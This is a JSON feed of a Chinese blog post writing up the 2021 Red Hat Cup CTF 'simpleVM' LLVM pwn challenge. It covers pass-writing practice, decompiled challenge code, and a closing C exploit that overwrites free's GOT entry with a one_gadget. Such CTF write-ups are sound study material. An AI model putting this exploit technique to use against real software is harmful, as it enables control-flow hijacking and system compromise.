{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog • All posts by \"pwn\" tag",
    "description": "introvert",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/11/08/2021-redhat-simpleVM/",
            "url": "https://squirre17.github.io/2022/11/08/2021-redhat-simpleVM/",
            "title": "2021 redhat simpleVM",
            "date_published": "2022-11-08T11:09:36.000Z",
            "content_html": "<p><a href=\"https://github.com/fghcvjk/2021redhat\">GitHub - fghcvjk/2021redhat: 第四届 “红帽杯” 网络安全大赛 - 初赛</a></p>\n<p>对于 llvm pwn<br>\n 需要三个组件 一个是 opt 用于将一个对 ir 操作的规则 so 加载到一个 lr or bc 文件里。从而完成 ir 层面的处理。</p>\n<p>而这里已经给了 opt 与 so 我们要写的就是 bc 去利用这个 opt。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] &#x27;/home/squ/prac/pwn/opt-8&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO      X</span><br><span class=\"line\">    Stack:    No canary found    X</span><br><span class=\"line\">    NX:       NX enabled         √</span><br><span class=\"line\">    PIE:      No PIE (0x400000)  X</span><br></pre></td></tr></table></figure>\n<h1 id=\"pass练习\"><a class=\"markdownIt-Anchor\" href=\"#pass练习\">#</a> pass 练习</h1>\n<p>假设我要找到一个函数的所有调用</p>\n<ul>\n<li>拿到一个 function</li>\n<li>遍历所有 BasicBlock</li>\n<li>遍历 BB 中的所有 instruction</li>\n<li>根据 instruction 构造一个 CallBase 也就是这个 instruction 是存在调用的 (如果 dyn_cast 不出来就跳过 说明不是 call)</li>\n<li>getNumOperands 可以得到所有操作数 记住 这里和 ghidra 一样 第一个 Operand 是函数地址</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%<span class=\"number\">9</span> = call i32 (ptr, ...) @<span class=\"built_in\">printf</span>(ptr noundef @.str)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>然后通过 getArgOperand cast 到 ConstantInt 再 getZExtValue 就能得到操作数的值 同样的 会有错误情况，比如是一个字符串不是数字 需要 continue</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Pass.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/InstrTypes.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/Constants.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\">using namespace llvm;</span><br><span class=\"line\">using <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>;</span><br><span class=\"line\">using <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">using <span class=\"built_in\">std</span>::<span class=\"built_in\">string</span>;</span><br><span class=\"line\"><span class=\"comment\">/* anonymous namespace. visible only to the current file. */</span></span><br><span class=\"line\">namespace &#123;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Squ</span> :</span> public FunctionPass &#123;</span><br><span class=\"line\">  <span class=\"type\">static</span> <span class=\"type\">char</span> ID;</span><br><span class=\"line\">  Squ() : FunctionPass(ID) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*  which overrides an abstract virtual method inherited from FunctionPass. */</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> <span class=\"title function_\">runOnFunction</span><span class=\"params\">(Function &amp;F)</span> override &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* print the function name */</span></span><br><span class=\"line\">    errs().write_escaped(F.getName()) &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">/* BasicBlock iterator */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">auto</span> &amp;BB_i : F)&#123;</span><br><span class=\"line\">        <span class=\"comment\">/* Istruction iterator */</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">auto</span> &amp;I_i : BB_i)&#123;</span><br><span class=\"line\">            Value *CalledFunction;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">auto</span> *CB = dyn_cast&lt;CallBase&gt;(&amp;I_i))&#123;</span><br><span class=\"line\">                CalledFunction = CB-&gt;getCalledFunction();</span><br><span class=\"line\">                StringRef Name = CalledFunction-&gt;getName();</span><br><span class=\"line\">                <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num = CB-&gt;getNumOperands();</span><br><span class=\"line\"></span><br><span class=\"line\">                errs() &lt;&lt; <span class=\"string\">&quot;\\tCall : &quot;</span> &lt;&lt; Name &lt;&lt; <span class=\"string\">&quot; with &quot;</span> \\</span><br><span class=\"line\">                    &lt;&lt; num &lt;&lt; <span class=\"string\">&quot; argus&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">for</span>(<span class=\"keyword\">auto</span> i = <span class=\"number\">0</span>; i &lt; num - <span class=\"number\">1</span>; i++)&#123;</span><br><span class=\"line\">                    ConstantInt *ci = dyn_cast&lt;ConstantInt&gt;(CB-&gt;getArgOperand(i));</span><br><span class=\"line\">                    <span class=\"comment\">// assert(ci != NULL);</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(ci == <span class=\"literal\">NULL</span>) <span class=\"keyword\">continue</span>; <span class=\"comment\">// not a digital</span></span><br><span class=\"line\">                    errs() &lt;&lt; <span class=\"string\">&quot;\\t\\t&quot;</span> &lt;&lt; ci-&gt;getZExtValue();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                errs() &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;; <span class=\"comment\">// end of struct Squ</span></span><br><span class=\"line\">&#125;  <span class=\"comment\">// end of anonymous namespace</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* LLVM uses ID’s address to identify a pass */</span></span><br><span class=\"line\"><span class=\"type\">char</span> Squ::ID = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"comment\">/* important here for cmd-line use */</span></span><br><span class=\"line\"><span class=\"type\">static</span> RegisterPass&lt;Squ&gt; <span class=\"title function_\">X</span><span class=\"params\">(<span class=\"string\">&quot;squ&quot;</span>, <span class=\"string\">&quot;squ Pass&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"literal\">false</span> <span class=\"comment\">/* Only looks at CFG */</span>,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"literal\">false</span> <span class=\"comment\">/* Analysis Pass */</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> RegisterStandardPasses <span class=\"title function_\">Y</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class=\"line\"><span class=\"params\">    [](<span class=\"type\">const</span> PassManagerBuilder &amp;Builder,</span></span><br><span class=\"line\"><span class=\"params\">       legacy::PassManagerBase &amp;PM) &#123; PM.add(new Squ()); &#125;)</span>;</span><br></pre></td></tr></table></figure>\n<h1 id=\"分析\"><a class=\"markdownIt-Anchor\" href=\"#分析\">#</a> 分析</h1>\n<p>不过首先先分析他的 IR 规则 找到 start 这就是 ir 对象的注册点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">start</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+18h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+28h] [rbp-58h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"string\">&quot;VMPass&quot;</span> )</span><br><span class=\"line\">    v2 = <span class=\"built_in\">strlen</span>(<span class=\"string\">&quot;VMPass&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"string\">&quot;VMPass&quot;</span> )</span><br><span class=\"line\">    v1 = <span class=\"built_in\">strlen</span>(<span class=\"string\">&quot;VMPass&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sub_6510((<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)&amp;unk_20E990, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)<span class=\"string\">&quot;VMPass&quot;</span>, v2, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)<span class=\"string\">&quot;VMPass&quot;</span>, v1, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>找到虚表 (Pass 类)<br>\n<img src=\"/2022/11/08/2021-redhat-simpleVM/simpleVM_vtable.png\" alt></p>\n<p>这个 6830 就是 runOnFunction</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_6830</span><span class=\"params\">(__int64 a1, llvm::Value *a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> v4; <span class=\"comment\">// [rsp+7h] [rbp-119h]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v5; <span class=\"comment\">// [rsp+10h] [rbp-110h]</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">void</span> *Name; <span class=\"comment\">// [rsp+28h] [rbp-F8h]</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// [rsp+30h] [rbp-F0h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [rsp+94h] [rbp-8Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  Name = (<span class=\"type\">const</span> <span class=\"type\">void</span> *)llvm::Value::getName(a2);</span><br><span class=\"line\">  v7 = v2;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"string\">&quot;o0o0o0o0&quot;</span> )</span><br><span class=\"line\">    v5 = <span class=\"built_in\">strlen</span>(<span class=\"string\">&quot;o0o0o0o0&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    v5 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v7 == v5 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 )</span><br><span class=\"line\">      v8 = <span class=\"built_in\">memcmp</span>(Name, <span class=\"string\">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      v8 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v4 = v8 == <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4 )</span><br><span class=\"line\">    trigger(a1, a2);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>断点在 Name 后可以看到  <code>llvm::Value::getName</code>  获得的是函数名</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/s <span class=\"variable\">$rax</span></span></span><br><span class=\"line\">0x8241f0:       &quot;function1&quot;</span><br></pre></td></tr></table></figure>\n<p>也就是我们函数名要为 <code>o0o0o0o0</code>  才能进入</p>\n<p>然后跟入 此处有明显的迭代器痕迹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">trigger</span><span class=\"params\">(__int64 a1, llvm::Function *a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+20h] [rbp-30h]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class=\"line\">  __int64 v5[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5[<span class=\"number\">1</span>] = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v5[<span class=\"number\">0</span>] = llvm::Function::begin(a2);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = llvm::Function::end(a2);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class=\"number\">1</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t   <span class=\"comment\">/* 迭代器解引用 */</span></span><br><span class=\"line\">    iter = llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class=\"literal\">false</span>,<span class=\"literal\">false</span>,<span class=\"type\">void</span>&gt;,<span class=\"literal\">false</span>,<span class=\"literal\">false</span>&gt;::operator*(v5);</span><br><span class=\"line\">    sub_6B80(a1, iter, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class=\"literal\">false</span>,<span class=\"literal\">false</span>,<span class=\"type\">void</span>&gt;,<span class=\"literal\">false</span>,<span class=\"literal\">false</span>&gt;::operator++(</span><br><span class=\"line\">      v5,</span><br><span class=\"line\">      <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>llvm::CallBase::getCalledFunction : Returns the function called</li>\n</ul>\n<p>对每个函数遍历后会在 sub_6B80 中对基本块遍历<br>\n从基本块中获取每一个指令 然后 getOpcode (比如 call store)<br>\n 取出调用的函数名 比如 <code>add(1,2)</code>  这里就取出 add</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  v38 = llvm::BasicBlock::end(a2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (llvm::operator!=(v39, &amp;v38) &amp; <span class=\"number\">1</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class=\"literal\">false</span>,<span class=\"literal\">false</span>,<span class=\"type\">void</span>&gt;,<span class=\"literal\">false</span>,<span class=\"literal\">false</span>&gt;&gt;((__int64)v39);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)llvm::Instruction::getOpcode(v36) == <span class=\"string\">&#x27;7&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v35 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      s1 = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">      CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class=\"line\">      Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class=\"line\">      *(_QWORD *)s1 = *Name;</span><br><span class=\"line\">      *((_QWORD *)s1 + <span class=\"number\">1</span>) = Name[<span class=\"number\">1</span>];</span><br><span class=\"line\">      *((_QWORD *)s1 + <span class=\"number\">2</span>) = Name[<span class=\"number\">2</span>];</span><br><span class=\"line\">      *((_QWORD *)s1 + <span class=\"number\">3</span>) = Name[<span class=\"number\">3</span>];</span><br></pre></td></tr></table></figure>\n<p>然后就是虚拟机程序了 根据调用的函数来进行虚拟机执行</p>\n<ul>\n<li>REG_x 分别是 LOAD 段上的两个地址</li>\n<li>这里会先用 llvm::CallBase::getNumOperands 判断有几个参数</li>\n<li>llvm::CallBase::getArgOperand (v35, 0) 然后获得第一个参数 (是类方法，所以 rdi 是自己的地址，第二个是参数的 idx)</li>\n<li>llvm::dyn_cast 对象调用 llvm::ConstantInt::getZExtValue 就是是获得这个值的 0 拓展 GDB 验证了一下</li>\n<li>然后根据第一个参数是 0 是 1 对 REG_x 中存放的地址处写入别的 REG 中的内容</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;store&quot;</span>) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)llvm::CallBase::getNumOperands(v35) == <span class=\"number\">2</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v25 = llvm::CallBase::getArgOperand(v35, <span class=\"number\">0</span>);</span><br><span class=\"line\">    v24 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v23 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v22 == <span class=\"number\">1</span> )</span><br><span class=\"line\">        v24 = REG_1;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v22 == <span class=\"number\">2</span> )</span><br><span class=\"line\">        v24 = REG_2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v24 == REG_1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      **(_QWORD **)REG_1 = *(_QWORD *)REG_2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v24 == REG_2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      **(_QWORD **)REG_2 = *(_QWORD *)REG_1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>剩下的分析也都大同小异</p>\n<ul>\n<li>reg1 中给到 free_got 的值 (free 就在后面结束被调用)</li>\n<li>free_got 里的内容写给 reg2</li>\n<li>reg2 加上偏移得到 one_gadget</li>\n<li>one_gadget store 回 free_got</li>\n</ul>\n<p>由于我懒得换到小版本的 libc 了，所以就最后验证了一下写回<br>\n<img src=\"/2022/11/08/2021-redhat-simpleVM/result.png\" alt></p>\n<h1 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h1>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">store</span><span class=\"params\">(<span class=\"type\">int</span> a)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">load</span><span class=\"params\">(<span class=\"type\">int</span> a)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">int</span> a, <span class=\"type\">int</span> b)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">pop</span><span class=\"params\">(<span class=\"type\">int</span> a)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> FREE_GOT 0x77e100</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">o0o0o0o0</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    add(<span class=\"number\">1</span>, FREE_GOT);   <span class=\"comment\">// REG_1            = FREE_GOT</span></span><br><span class=\"line\">    load(<span class=\"number\">1</span>);            <span class=\"comment\">// REG_2            = content of FREE_GOT</span></span><br><span class=\"line\">    add(<span class=\"number\">2</span>, <span class=\"number\">0x49434</span>);    <span class=\"comment\">// REG_2           += offset</span></span><br><span class=\"line\">    store(<span class=\"number\">1</span>);           <span class=\"comment\">// content of REG_1 = REG_2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    o0o0o0o0();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "pwn",
                "llvm"
            ]
        }
    ]
}